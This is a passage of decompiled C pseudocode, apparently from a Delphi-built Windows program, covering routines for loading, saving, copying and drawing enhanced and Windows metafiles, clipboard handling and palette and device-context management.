  *in_FS_OFFSET = uStack40;
  puStack32 = &LAB_0041ca6a;
  puStack36 = (undefined *)0x41ca62;
  FUN_004047a8((int *)&local_10);
  return;
}



void FUN_0041ca74(undefined4 *param_1,uint *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined uVar3;
  undefined4 uStack292;
  undefined *puStack288;
  undefined *puStack284;
  byte local_10c [256];
  uint *local_c;
  uint *local_8;
  
  puStack284 = &stack0xfffffffc;
  local_c = (uint *)0x0;
  puStack288 = &LAB_0041caf2;
  uStack292 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack292;
  iVar2 = param_1[2] + -1;
  uVar3 = iVar2 == 0;
  local_8 = param_2;
  if (-1 < iVar2) {
    do {
      piVar1 = (int *)FUN_00411aa4(param_1,iVar2);
      FUN_00403a9c(*piVar1,local_10c);
      FUN_00404a0c((int *)&local_c,local_10c);
      FUN_00404bb4(local_c,local_8);
      if ((bool)uVar3) break;
      iVar2 = iVar2 + -1;
      uVar3 = iVar2 == -1;
    } while (!(bool)uVar3);
  }
  *in_FS_OFFSET = uStack292;
  puStack284 = &LAB_0041caf9;
  puStack288 = (undefined *)0x41caf1;
  FUN_004047a8((int *)&local_c);
  return;
}



void FUN_0041cb04(int *param_1,int param_2)

{
  int **ppiVar1;
  int *piVar2;
  int iVar3;
  
  iVar3 = param_1[2] + -1;
  if (-1 < iVar3) {
    do {
      ppiVar1 = (int **)FUN_00411aa4(param_1,iVar3);
      piVar2 = thunk_FUN_00403d54((int)*ppiVar1,param_2);
      if ((char)piVar2 != '\0') {
        FUN_00405658(ppiVar1,"\x0e\vTFileFormat\x10");
        FUN_004119b4(param_1,iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  return;
}



void FUN_0041cb50(int param_1,int param_2)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  
  iVar3 = *(int *)(*(int *)(param_1 + 4) + 8) + -1;
  if (-1 < iVar3) {
    do {
      iVar1 = FUN_00411aa4(*(undefined4 **)(param_1 + 4),iVar3);
      piVar2 = thunk_FUN_00403d54(iVar1,param_2);
      if ((char)piVar2 != '\0') {
        FUN_004119b4(*(int **)(param_1 + 4),iVar3);
        FUN_004119b4(*(int **)(param_1 + 8),iVar3);
      }
      iVar3 = iVar3 + -1;
    } while (iVar3 != -1);
  }
  return;
}



int FUN_0041cb98(void)

{
  if (DAT_004409e8 == 0) {
    DAT_004409e8 = FUN_0041c860((int *)&LAB_0041c83c,'\x01');
  }
  return DAT_004409e8;
}



void FUN_0041cc1c(int *param_1,int param_2)

{
  int *piVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  
  piVar1 = (int *)param_1[3];
  uVar2 = FUN_00403cb0(piVar1,param_2);
  if ((char)uVar2 == '\0') {
    FUN_00403b24(piVar1);
    param_1[3] = 0;
    iVar3 = (**(code **)(param_2 + 0x48))(param_2,1);
    param_1[3] = iVar3;
    *(int **)(iVar3 + 0x14) = param_1;
    uVar2 = FUN_00403d38(param_1,CONCAT22(extraout_var,0xfffd));
    *(undefined4 *)(iVar3 + 0x10) = uVar2;
    *(int **)(iVar3 + 0x1c) = param_1;
    uVar2 = FUN_00403d38(param_1,CONCAT22(extraout_var_00,0xfffc));
    *(undefined4 *)(iVar3 + 0x18) = uVar2;
    FUN_00403d20(param_1,param_1,extraout_ECX);
  }
  return;
}



void FUN_0041cc98(int *param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined2 extraout_var;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  int *piStack24;
  int *local_8;
  
  local_8 = (int *)0x0;
  if (param_2 != (undefined4 *)0x0) {
    piStack24 = (int *)0x41ccb3;
    iVar1 = FUN_00403a94(param_2);
    piStack24 = (int *)0x41ccb8;
    local_8 = (int *)(**(code **)(iVar1 + 0x48))(iVar1,1);
    piStack24 = (int *)0x41ccc5;
    (**(code **)(*local_8 + 8))(local_8,param_2);
    local_8[5] = (int)param_1;
    puStack28 = (undefined *)0x41ccd7;
    piStack24 = local_8;
    iVar1 = FUN_00403d38(param_1,CONCAT22(extraout_var,0xfffd));
    piStack24[4] = iVar1;
    local_8[7] = (int)param_1;
    puStack28 = (undefined *)0x41ccef;
    piStack24 = local_8;
    iVar1 = FUN_00403d38(param_1,CONCAT22((short)((uint)iVar1 >> 0x10),0xfffc));
    piStack24[6] = iVar1;
  }
  puStack28 = &DAT_0041cd28;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  piStack24 = (int *)&stack0xfffffffc;
  FUN_00403b24((int *)param_1[3]);
  param_1[3] = (int)local_8;
  FUN_00403d20(param_1,param_1,extraout_ECX);
  *in_FS_OFFSET = uStack32;
  return;
}



void FUN_0041cdd4(undefined4 param_1,undefined *param_2,undefined4 *param_3,undefined4 param_4)

{
  int *piVar1;
  undefined4 uVar2;
  
  uVar2 = 0;
  piVar1 = (int *)FUN_0041cb98();
  FUN_0041c9e0(piVar1,param_2,param_3,param_4,uVar2);
  return;
}



void FUN_0041cdf8(undefined4 param_1,int param_2)

{
  if (DAT_004409e8 != (int *)0x0) {
    FUN_0041cb04(DAT_004409e8,param_2);
  }
  if (DAT_004409e4 != 0) {
    FUN_0041cb50(DAT_004409e4,param_2);
  }
  return;
}



void FUN_0041ce28(int param_1)

{
  if (*(short *)(param_1 + 0x12) != 0) {
    (**(code **)(param_1 + 0x10))(*(undefined4 *)(param_1 + 0x14),param_1);
  }
  if (*(int *)(param_1 + 0x18) != 0) {
    (**(code **)(**(int **)(param_1 + 0x18) + 0xc))();
  }
  return;
}



bool FUN_0041cfe8(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int *piVar1;
  int *piVar2;
  char cVar3;
  undefined4 uVar4;
  bool bVar5;
  
  piVar1 = *(int **)(*(int *)(param_4 + -4) + 0x20);
  if (piVar1 == (int *)0x0) {
    bVar5 = *(int *)(*(int *)(param_4 + -8) + 0xc) != 0;
  }
  else {
    bVar5 = true;
    uVar4 = FUN_00403cb0(piVar1,(int)&PTR_LAB_00419344);
    if ((char)uVar4 != '\0') {
      if ((*(int *)(*(int *)(param_4 + -8) + 0xc) == piVar1[3]) ||
         (((piVar2 = *(int **)(*(int *)(param_4 + -8) + 0xc), piVar2 != (int *)0x0 &&
           (piVar1[3] != 0)) &&
          (cVar3 = (**(code **)(*piVar2 + 0x18))(piVar2,piVar1[3]), cVar3 != '\0')))) {
        bVar5 = false;
      }
      else {
        bVar5 = true;
      }
    }
  }
  return bVar5;
}



void FUN_0041d064(undefined4 param_1,int *param_2)

{
  bool bVar1;
  undefined in_CL;
  undefined *puVar2;
  undefined *puVar3;
  undefined4 uVar4;
  
  puVar3 = &LAB_0041ce74;
  puVar2 = &LAB_0041cf8c;
  uVar4 = param_1;
  bVar1 = FUN_0041cfe8((char)param_1,(char)param_2,in_CL,&stack0xfffffffc);
  (**(code **)(*param_2 + 8))(param_2,&LAB_0041d0a8,bVar1,puVar2,param_1,puVar3,uVar4);
  return;
}



void FUN_0041d1fc(int *param_1,int *param_2,LONG *param_3)

{
  HPALETTE pHVar1;
  HDC pHVar2;
  HPALETTE pHVar3;
  LONG *pLVar4;
  LONG *pLVar5;
  byte bVar6;
  LONG aLStackY6140 [1523];
  HENHMETAFILE hmf;
  BOOL BVar7;
  RECT *lprect;
  RECT RStack32;
  
  bVar6 = 0;
  if (param_1[10] != 0) {
    pHVar1 = (HPALETTE)(**(code **)(*param_1 + 0x24))();
    pHVar3 = (HPALETTE)0x0;
    if (pHVar1 != (HPALETTE)0x0) {
      BVar7 = -1;
      pHVar3 = pHVar1;
      pHVar2 = (HDC)FUN_0041af24(param_2);
      pHVar3 = SelectPalette(pHVar2,pHVar3,BVar7);
      pHVar2 = (HDC)FUN_0041af24(param_2);
      RealizePalette(pHVar2);
    }
    pLVar4 = param_3 + (uint)bVar6 * -2 + 1;
    RStack32.left = *param_3;
    pLVar5 = (LONG *)((int)&RStack32 + (uint)bVar6 * -8 + (uint)bVar6 * -8 + 8);
    *(LONG *)((int)&RStack32 + (uint)bVar6 * -8 + 4) = *pLVar4;
    *pLVar5 = pLVar4[(uint)bVar6 * -2 + 1];
    pLVar5[(uint)bVar6 * -2 + 1] = (pLVar4 + (uint)bVar6 * -2 + 1)[(uint)bVar6 * -2 + 1];
    RStack32.right = RStack32.right + -1;
    RStack32.bottom = RStack32.bottom + -1;
    lprect = &RStack32;
    hmf = *(HENHMETAFILE *)(param_1[10] + 8);
    pHVar2 = (HDC)FUN_0041af24(param_2);
    PlayEnhMetaFile(pHVar2,hmf,lprect);
    if (pHVar1 != (HPALETTE)0x0) {
      BVar7 = -1;
      pHVar2 = (HDC)FUN_0041af24(param_2);
      SelectPalette(pHVar2,pHVar3,BVar7);
    }
  }
  return;
}



void FUN_0041d43c(int param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  
  FUN_0041e110(*(int **)(param_1 + 0x28));
  iVar1 = FUN_00403af4((int *)&PTR_LAB_00419450,'\x01',extraout_ECX);
  *(int *)(param_1 + 0x28) = iVar1;
  FUN_0041e10c(iVar1);
  return;
}



void FUN_0041d464(int *param_1,int *param_2,int param_3)

{
  undefined4 uVar1;
  int iVar2;
  int iStack16;
  
  iStack16 = param_3;
  (**(code **)(*param_2 + 0xc))(param_2,&iStack16,4);
  if (iStack16 < 5) {
    (**(code **)(*param_1 + 8))(param_1,0);
  }
  else {
    uVar1 = FUN_0041d964(param_1,param_2);
    if ((char)uVar1 == '\0') {
      FUN_0041d5a0((int)param_1,param_2,iStack16 + -4);
    }
    else {
      FUN_0041d4d0((int)param_1,param_2);
    }
  }
  iVar2 = (**(code **)(*param_1 + 0x24))();
  *(bool *)((int)param_1 + 0x22) = iVar2 != 0;
  (**(code **)(*param_1 + 0x10))(param_1,param_1);
  return;
}



void FUN_0041d4d0(int param_1,int *param_2)

{
  int iVar1;
  HENHMETAFILE pHVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack132;
  undefined *puStack128;
  undefined *puStack124;
  undefined4 local_6c [6];
  int local_54;
  int local_50;
  int local_4c;
  int local_48;
  int local_44;
  UINT local_3c;
  undefined4 *local_8;
  
  puStack124 = (undefined *)0x41d4e4;
  FUN_0041d43c(param_1);
  puStack124 = (undefined *)0x41d4f3;
  FUN_00413604(param_2,local_6c,100);
  if (local_44 != 0x464d4520) {
    puStack124 = (undefined *)0x41d501;
    FUN_0041b214();
  }
  puStack124 = (undefined *)0x41d509;
  local_8 = (undefined4 *)FUN_004026a8(local_3c);
  iVar1 = *(int *)(param_1 + 0x28);
  puStack128 = &LAB_0041d590;
  uStack132 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack132;
  puStack124 = &stack0xfffffffc;
  FUN_0040285c(local_6c,local_8,100);
  FUN_00413604(param_2,local_8 + 0x19,local_3c - 100);
  pHVar2 = SetEnhMetaFileBits(local_3c,(BYTE *)local_8);
  *(HENHMETAFILE *)(iVar1 + 8) = pHVar2;
  if (pHVar2 == (HENHMETAFILE)0x0) {
    FUN_0041b214();
  }
  *(undefined2 *)(iVar1 + 0x18) = 0;
  *(int *)(iVar1 + 0xc) = local_4c - local_54;
  *(int *)(iVar1 + 0x10) = local_48 - local_50;
  *(undefined *)(param_1 + 0x2c) = 1;
  *in_FS_OFFSET = uStack132;
  puStack124 = &LAB_0041d597;
  puStack128 = (undefined *)0x41d58f;
  FUN_004026c8((int)local_8);
  return;
}



void FUN_0041d5a0(int param_1,int *param_2,int param_3)

{
  int iVar1;
  ushort uVar2;
  int iVar3;
  HENHMETAFILE pHVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack180;
  undefined *puStack176;
  undefined *puStack172;
  undefined local_9a [104];
  LONG local_32;
  LONG local_2e;
  undefined4 local_2a;
  int local_26;
  short local_20;
  short local_1e;
  short local_1c;
  short local_1a;
  ushort local_18;
  ushort local_12;
  BYTE *local_10;
  UINT local_c;
  int *local_8;
  
  puStack172 = (undefined *)0x41d5bb;
  local_c = param_3;
  local_8 = param_2;
  FUN_0041d43c(param_1);
  puStack172 = (undefined *)0x41d5cb;
  (**(code **)(*local_8 + 0xc))(local_8,&local_26,0x16);
  if (local_26 == -0x65393229) {
    puStack172 = (undefined *)0x41d5dc;
    uVar2 = FUN_0041c064((ushort *)&local_26);
    if (uVar2 == local_12) goto LAB_0041d5e7;
  }
  puStack172 = (undefined *)0x41d5e7;
  FUN_0041b214();
LAB_0041d5e7:
  local_c = local_c - 0x16;
  puStack172 = (undefined *)0x41d5f3;
  local_10 = (BYTE *)FUN_004026a8(local_c);
  iVar1 = *(int *)(param_1 + 0x28);
  puStack176 = &LAB_0041d70f;
  uStack180 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack180;
  puStack172 = &stack0xfffffffc;
  (**(code **)(*local_8 + 0xc))(local_8,local_10,local_c);
  *(ushort *)(*(int *)(param_1 + 0x28) + 0x18) = local_18;
  if (local_18 == 0) {
    local_18 = 0x60;
  }
  iVar3 = MulDiv((int)local_1c - (int)local_20,0x9ec,(uint)local_18);
  *(int *)(iVar1 + 0xc) = iVar3;
  iVar3 = MulDiv((int)local_1a - (int)local_1e,0x9ec,(uint)local_18);
  *(int *)(iVar1 + 0x10) = iVar3;
  local_9a._100_4_ = 8;
  local_32 = 0;
  local_2e = 0;
  local_2a = 0;
  pHVar4 = SetWinMetaFileBits(local_c,local_10,(HDC)0x0,(METAFILEPICT *)(local_9a + 100));
  *(HENHMETAFILE *)(iVar1 + 8) = pHVar4;
  if (pHVar4 == (HENHMETAFILE)0x0) {
    FUN_0041b214();
  }
  GetEnhMetaFileHeader(*(HENHMETAFILE *)(iVar1 + 8),100,(LPENHMETAHEADER)local_9a);
  local_9a._100_4_ = 8;
  local_32 = local_9a._32_4_;
  local_2e = local_9a._36_4_;
  local_2a = 0;
  DeleteEnhMetaFile(*(HENHMETAFILE *)(iVar1 + 8));
  pHVar4 = SetWinMetaFileBits(local_c,local_10,(HDC)0x0,(METAFILEPICT *)(local_9a + 100));
  *(HENHMETAFILE *)(iVar1 + 8) = pHVar4;
  if (pHVar4 == (HENHMETAFILE)0x0) {
    FUN_0041b214();
  }
  *(undefined *)(param_1 + 0x2c) = 0;
  *in_FS_OFFSET = uStack180;
  puStack172 = &LAB_0041d716;
  puStack176 = (undefined *)0x41d70e;
  FUN_004026c8((int)local_10);
  return;
}



void FUN_0041d874(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  
  if (param_1[10] == 0) {
    FUN_0041d43c((int)param_1);
    param_3 = extraout_ECX;
  }
  iVar1 = param_1[10];
  *(undefined4 *)(iVar1 + 0x20) = 0;
  if (param_2 != *(int *)(iVar1 + 0x10)) {
    FUN_0041d9c4((int)param_1,0,param_3);
    *(int *)(param_1[10] + 0x10) = param_2;
    (**(code **)(*param_1 + 0x10))(param_1,param_1);
  }
  return;
}



void FUN_0041d8b0(int *param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  undefined4 extraout_ECX;
  
  if (param_1[10] == 0) {
    FUN_0041d43c((int)param_1);
    param_3 = extraout_ECX;
  }
  iVar1 = param_1[10];
  *(undefined4 *)(iVar1 + 0x1c) = 0;
  if (param_2 != *(int *)(iVar1 + 0xc)) {
    FUN_0041d9c4((int)param_1,0,param_3);
    *(int *)(param_1[10] + 0xc) = param_2;
    (**(code **)(*param_1 + 0x10))(param_1,param_1);
  }
  return;
}



undefined4 FUN_0041d964(undefined4 param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  undefined2 extraout_var;
  int aiStack112 [10];
  int iStack72;
  
  iVar1 = (**(code **)*param_2)();
  iVar2 = FUN_004133d8(param_2);
  if (100 < iVar1 - iVar2) {
    (**(code **)(*param_2 + 0xc))(param_2,aiStack112,100);
    uVar3 = (**(code **)(*param_2 + 0x14))(param_2,0xffffff9c,CONCAT22(extraout_var,1));
    if ((aiStack112[0] == 1) && (iStack72 == 0x464d4520)) {
      return CONCAT31((int3)((uint)uVar3 >> 8),1);
    }
  }
  return 0;
}



void FUN_0041d9c4(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  HENHMETAFILE pHVar2;
  
  if (*(int *)(param_1 + 0x28) == 0) {
    FUN_0041d43c(param_1);
  }
  else if (1 < *(int *)(*(int *)(param_1 + 0x28) + 4)) {
    iVar1 = FUN_00403af4((int *)&PTR_LAB_00419450,'\x01',param_3);
    pHVar2 = *(HENHMETAFILE *)(*(int *)(param_1 + 0x28) + 8);
    if (pHVar2 != (HENHMETAFILE)0x0) {
      pHVar2 = CopyEnhMetaFileA(pHVar2,(LPCSTR)0x0);
      *(HENHMETAFILE *)(iVar1 + 8) = pHVar2;
    }
    *(undefined4 *)(iVar1 + 0x10) = *(undefined4 *)(*(int *)(param_1 + 0x28) + 0x10);
    *(undefined4 *)(iVar1 + 0xc) = *(undefined4 *)(*(int *)(param_1 + 0x28) + 0xc);
    *(undefined2 *)(iVar1 + 0x18) = *(undefined2 *)(*(int *)(param_1 + 0x28) + 0x18);
    *(undefined4 *)(iVar1 + 0x1c) = *(undefined4 *)(*(int *)(param_1 + 0x28) + 0x1c);
    *(undefined4 *)(iVar1 + 0x20) = *(undefined4 *)(*(int *)(param_1 + 0x28) + 0x20);
    FUN_0041e110(*(int **)(param_1 + 0x28));
    *(int *)(param_1 + 0x28) = iVar1;
    FUN_0041e10c(iVar1);
  }
  return;
}



void FUN_0041da48(int param_1,int *param_2)

{
  int iVar1;
  undefined2 extraout_var;
  int local_10;
  
  if (*(int *)(param_1 + 0x28) != 0) {
    local_10 = 0;
    (**(code **)(*param_2 + 0x10))(param_2,&local_10,4);
    local_10 = FUN_004133d8(param_2);
    local_10 = local_10 + -4;
    if (*(char *)(param_1 + 0x2c) == '\0') {
      FUN_0041db54(param_1,param_2);
    }
    else {
      FUN_0041dac8(param_1,param_2);
    }
    (**(code **)(*param_2 + 0x14))(param_2,local_10,0);
    iVar1 = (**(code **)*param_2)();
    local_10 = iVar1 - local_10;
    (**(code **)(*param_2 + 0x10))(param_2,&local_10,4);
    (**(code **)(*param_2 + 0x14))(param_2,0,CONCAT22(extraout_var,2));
  }
  return;
}



void FUN_0041dac8(int param_1,int *param_2)

{
  UINT nSize;
  LPBYTE lpData;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  
  if (*(int *)(param_1 + 0x28) != 0) {
    nSize = GetEnhMetaFileBits(*(HENHMETAFILE *)(*(int *)(param_1 + 0x28) + 8),0,(LPBYTE)0x0);
    if (nSize != 0) {
      lpData = (LPBYTE)FUN_004026a8(nSize);
      uVar1 = *in_FS_OFFSET;
      *in_FS_OFFSET = &stack0xffffffe0;
      GetEnhMetaFileBits(*(HENHMETAFILE *)(*(int *)(param_1 + 0x28) + 8),nSize,lpData);
      FUN_0041363c(param_2,lpData,nSize);
      *in_FS_OFFSET = uVar1;
      FUN_004026c8((int)lpData);
      return;
    }
  }
  return;
}



void FUN_0041db54(int param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  UINT UVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar4;
  undefined4 local_26 [2];
  undefined2 local_1c;
  undefined2 local_1a;
  ushort local_18;
  ushort local_12;
  HDC local_10;
  UINT local_c;
  LPBYTE local_8;
  
  if (*(int *)(param_1 + 0x28) == 0) {
    return;
  }
  FUN_004030a0(local_26,0x16,0);
  iVar1 = *(int *)(param_1 + 0x28);
  local_26[0] = 0x9ac6cdd7;
  local_18 = *(ushort *)(iVar1 + 0x18);
  if (local_18 == 0) {
    local_18 = 0x60;
  }
  iVar2 = MulDiv(*(int *)(iVar1 + 0xc),(uint)local_18,0x9ec);
  local_1c = (undefined2)iVar2;
  iVar2 = MulDiv(*(int *)(iVar1 + 0x10),(uint)local_18,0x9ec);
  local_1a = (undefined2)iVar2;
  local_12 = FUN_0041c064((ushort *)local_26);
  local_10 = GetDC((HWND)0x0);
  *in_FS_OFFSET = &stack0xffffffc4;
  local_c = GetWinMetaFileBits(*(HENHMETAFILE *)(iVar1 + 8),0,(LPBYTE)0x0,8,local_10);
  local_8 = (LPBYTE)FUN_004026a8(local_c);
  uVar4 = *in_FS_OFFSET;
  *in_FS_OFFSET = &stack0xffffffb8;
  UVar3 = GetWinMetaFileBits(*(HENHMETAFILE *)(iVar1 + 8),local_c,local_8,8,local_10);
  if (UVar3 < local_c) {
    FUN_0041b274();
  }
  FUN_0041363c(param_2,local_26,0x16);
  FUN_0041363c(param_2,local_8,local_c);
  *in_FS_OFFSET = uVar4;
  FUN_004026c8((int)local_8);
  return;
}



void FUN_0041dc9c(int *param_1)

{
  HENHMETAFILE pHVar1;
  int iVar2;
  int local_50;
  int local_4c;
  int local_48;
  int local_44;
  
  pHVar1 = (HENHMETAFILE)GetClipboardData(0xe);
  if (pHVar1 == (HENHMETAFILE)0x0) {
    FUN_0041b1e4((int **)PTR_PTR_DAT_004414fc);
  }
  FUN_0041d43c((int)param_1);
  iVar2 = param_1[10];
  pHVar1 = CopyEnhMetaFileA(pHVar1,(LPCSTR)0x0);
  *(HENHMETAFILE *)(iVar2 + 8) = pHVar1;
  GetEnhMetaFileHeader(*(HENHMETAFILE *)(iVar2 + 8),100,(LPENHMETAHEADER)&stack0xffffff98);
  *(int *)(iVar2 + 0xc) = local_48 - local_50;
  *(int *)(iVar2 + 0x10) = local_44 - local_4c;
  *(undefined2 *)(iVar2 + 0x18) = 0;
  *(undefined *)(param_1 + 0xb) = 1;
  iVar2 = (**(code **)(*param_1 + 0x24))();
  *(bool *)((int)param_1 + 0x22) = iVar2 != 0;
  (**(code **)(*param_1 + 0x10))(param_1,param_1);
  return;
}



void FUN_0041dd20(int param_1,undefined2 *param_2,HENHMETAFILE *param_3,undefined4 *param_4)

{
  int iVar1;
  HENHMETAFILE pHVar2;
  
  iVar1 = *(int *)(param_1 + 0x28);
  if (iVar1 != 0) {
    *param_2 = 0xe;
    *param_4 = 0;
    pHVar2 = CopyEnhMetaFileA(*(HENHMETAFILE *)(iVar1 + 8),(LPCSTR)0x0);
    *param_3 = pHVar2;
  }
  return;
}



void FUN_0041ddf0(void)

{
  int iVar1;
  char cVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  int *local_10;
  undefined4 *local_c;
  int local_8;
  
  puStack20 = (undefined *)0x41de00;
  local_c = (undefined4 *)FUN_00411d48(DAT_004409ec);
  puStack24 = &LAB_0041de8e;
  uStack28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack28;
  puStack20 = &stack0xfffffffc;
  iVar1 = local_c[2] + -1;
  if (-1 < local_c[2] + -1) {
    do {
      local_8 = iVar1;
      puStack32 = (undefined *)0x41de2b;
      local_10 = (int *)FUN_00411aa4(local_c,local_8);
      puStack32 = (undefined *)0x41de36;
      cVar2 = FUN_0041ae08((int)local_10);
      if (cVar2 != '\0') {
        puStack36 = &LAB_0041de66;
        uStack40 = *in_FS_OFFSET;
        *in_FS_OFFSET = &uStack40;
        puStack32 = &stack0xfffffffc;
        FUN_0041df80(local_10);
        *in_FS_OFFSET = uStack40;
        puStack32 = (undefined *)0x41de6d;
        puStack36 = (undefined *)0x41de65;
        FUN_0041ae64((int)local_10);
        return;
      }
      local_8 = local_8 + -1;
      iVar1 = local_8;
    } while (local_8 != -1);
  }
  *in_FS_OFFSET = uStack28;
  puStack20 = &LAB_0041de95;
  puStack24 = (undefined *)0x41de8d;
  FUN_00411dac(DAT_004409ec);
  return;
}



void FUN_0041de9c(int param_1)

{
  undefined4 *puVar1;
  int *piVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  
  if (param_1 != 0) {
    puStack20 = (undefined *)0x41deb5;
    puVar1 = (undefined4 *)FUN_00411d48(DAT_004409ec);
    puStack24 = &LAB_0041df0c;
    uStack28 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack28;
    iVar3 = puVar1[2] + -1;
    puStack20 = &stack0xfffffffc;
    if (-1 < iVar3) {
      do {
        piVar2 = (int *)FUN_00411aa4(puVar1,iVar3);
        if ((piVar2[0x16] != 0) && (*(int *)(*(int *)(piVar2[0x16] + 0x28) + 8) == param_1)) {
          FUN_0041df80(piVar2);
        }
        iVar3 = iVar3 + -1;
      } while (iVar3 != -1);
    }
    *in_FS_OFFSET = uStack28;
    puStack20 = (undefined *)0x41df13;
    puStack24 = (undefined *)0x41df0b;
    FUN_00411dac(DAT_004409ec);
    return;
  }
  return;
}



int * FUN_0041df18(int *param_1,char param_2,int param_3)

{
  int extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_0041ac58(param_1,'\0',param_3);
  param_1[0x16] = param_3;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0041df80(int *param_1)

{
  HDC hdc;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  
  if (param_1[1] != 0) {
    puStack16 = (undefined *)0x41df9d;
    FUN_0041ad78((int)param_1);
    puStack20 = &LAB_0041e014;
    uStack24 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack24;
    puStack16 = &stack0xfffffffc;
    if ((HGDIOBJ)param_1[0x17] != (HGDIOBJ)0x0) {
      puStack16 = &stack0xfffffffc;
      SelectObject((HDC)param_1[1],(HGDIOBJ)param_1[0x17]);
    }
    if ((HPALETTE)param_1[0x18] != (HPALETTE)0x0) {
      SelectPalette((HDC)param_1[1],(HPALETTE)param_1[0x18],-1);
    }
    hdc = (HDC)param_1[1];
    FUN_0041afa4(param_1,0);
    DeleteDC(hdc);
    FUN_00411d5c(DAT_004409ec,(int)param_1);
    *in_FS_OFFSET = uStack24;
    puStack16 = (undefined *)0x41e01b;
    puStack20 = (undefined *)0x41e013;
    FUN_0041ae64((int)param_1);
    return;
  }
  return;
}



void FUN_0041e020(int *param_1)

{
  HDC hdc;
  HGDIOBJ pvVar1;
  HPALETTE pHVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack28;
  undefined *puStack24;
  undefined *puStack20;
  
  if (param_1[0x16] != 0) {
    puStack20 = (undefined *)0x41e03e;
    FUN_0041ad78((int)param_1);
    puStack24 = &LAB_0041e0ff;
    uStack28 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack28;
    puStack20 = &stack0xfffffffc;
    FUN_0041f3b4((int *)param_1[0x16],extraout_EDX,extraout_ECX);
    FUN_0041de9c(*(int *)(*(int *)(param_1[0x16] + 0x28) + 8));
    FUN_0041f4b4(param_1[0x16]);
    hdc = CreateCompatibleDC((HDC)0x0);
    pvVar1 = *(HGDIOBJ *)(*(int *)(param_1[0x16] + 0x28) + 8);
    if (pvVar1 == (HGDIOBJ)0x0) {
      param_1[0x17] = 0;
    }
    else {
      pvVar1 = SelectObject(hdc,pvVar1);
      param_1[0x17] = (int)pvVar1;
    }
    pHVar2 = *(HPALETTE *)(*(int *)(param_1[0x16] + 0x28) + 0x10);
    if (pHVar2 == (HPALETTE)0x0) {
      param_1[0x18] = 0;
    }
    else {
      pHVar2 = SelectPalette(hdc,pHVar2,-1);
      param_1[0x18] = (int)pHVar2;
      RealizePalette(hdc);
    }
    FUN_0041afa4(param_1,(int)hdc);
    FUN_00411cc0(DAT_004409ec,(int)param_1);
    *in_FS_OFFSET = uStack28;
    puStack20 = (undefined *)0x41e106;
    puStack24 = (undefined *)0x41e0fe;
    FUN_0041ae64((int)param_1);
    return;
  }
  return;
}



void FUN_0041e10c(int param_1)

{
  *(int *)(param_1 + 4) = *(int *)(param_1 + 4) + 1;
  return;
}



void FUN_0041e110(int *param_1)

{
  if ((param_1 != (int *)0x0) && (param_1[1] = param_1[1] + -1, param_1[1] == 0)) {
    (**(code **)*param_1)();
    FUN_00403b24(param_1);
  }
  return;
}



void FUN_0041e1d8(HGDIOBJ param_1,HPALETTE param_2,int param_3)

{
  UINT cEntries;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  tagPALETTEENTRY local_414 [256];
  HGDIOBJ local_14;
  HDC local_10;
  HDC local_c;
  HPALETTE local_8;
  
  if ((param_1 != (HGDIOBJ)0x0) && (*(ushort *)(param_3 + 0x26) < 9)) {
    local_8 = param_2;
    cEntries = FUN_0041bab0(param_2,local_414,0xff);
    if (cEntries != 0) {
      local_c = GetDC((HWND)0x0);
      local_10 = CreateCompatibleDC(local_c);
      local_14 = SelectObject(local_10,param_1);
      uVar1 = *in_FS_OFFSET;
      *in_FS_OFFSET = &stack0xfffffbd8;
      SetDIBColorTable(local_10,0,cEntries,(RGBQUAD *)local_414);
      *in_FS_OFFSET = uVar1;
      SelectObject(local_10,local_14);
      DeleteDC(local_10);
      ReleaseDC((HWND)0x0,local_c);
      return;
    }
  }
  return;
}



void FUN_0041e294(int param_1)

{
